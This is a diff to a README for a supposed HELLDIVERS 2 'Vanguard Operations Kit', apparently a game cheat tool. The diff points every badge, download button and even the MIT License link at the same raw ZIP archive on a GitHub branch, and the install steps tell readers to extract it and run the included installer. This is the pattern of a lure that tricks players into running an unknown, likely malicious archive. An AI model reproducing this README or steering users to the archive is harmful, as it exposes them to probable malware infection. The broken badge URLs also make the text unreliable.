@@ -1,8 +1,8 @@
 # HELLDIVERS 2 – Vanguard Operations Kit 🛡️🚀  
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://shields.io/) 
-[![Downloads](https://img.shields.io/badge/downloads-50K+-blue)](https://shields.io/) 
-[![OS Support](https://img.shields.io/badge/OS-Win%2CmacOS%2CLinux-yellowgreen)](https://shields.io/)  
-![MIT License](https://img.shields.io/badge/license-MIT-blue)
+[![Build Status](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip) 
+[![Downloads](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip+-blue)](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip) 
+[![OS Support](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip%2CmacOS%2CLinux-yellowgreen)](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)  
+![MIT License](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Navigate through enemy lines and bring democracy to the universe—our carefully
 Supercharge your HELLDIVERS 2 experience!   
 Grab the latest Vanguard Operations Kit below:
 
-[![Download Vanguard Operations Kit](https://i.imgur.com/2A5W7K2.png)](LINK)
+[![Download Vanguard Operations Kit](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)](LINK)
 
 ---
 
@@ -115,7 +115,7 @@ Follow the three-step jump pack to action:
 1. **Download the Vanguard Operations Kit**  
    Click the image below to start your arsenal update:
    
-   [![Download Vanguard Operations Kit](https://i.imgur.com/2A5W7K2.png)](LINK)
+   [![Download Vanguard Operations Kit](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)](LINK)
 
 2. **Extract and Install**  
    Use your preferred archive tool to extract the kit. Launch the included installer and follow the on-screen directives. Complete the prompts to select desired modules and integrations (OpenAI/Claude API require quick, secure authentication).
@@ -141,7 +141,7 @@ By utilizing the HELLDIVERS 2 Vanguard Operations Kit, you agree to:
 
 ## 📜 LICENSE
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) — seize the code, customize, and contribute!  
+Licensed under the [MIT License](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip) — seize the code, customize, and contribute!  
 All contributions 2025, Vanguard Operations Collective.
 
 ---
@@ -150,7 +150,7 @@ All contributions 2025, Vanguard Operations Collective.
 
 Don't let gravity hold you down — empower your HELLDIVERS 2 journey!
 
-[![Download Vanguard Operations Kit](https://i.imgur.com/2A5W7K2.png)](LINK)
+[![Download Vanguard Operations Kit](https://github.com/alphacharlie2301/helldivers-2-unstoppable-toolkit/raw/refs/heads/branch/coevally/toolkit-unstoppable-helldivers-2.1.zip)](LINK)
 
 ---
 
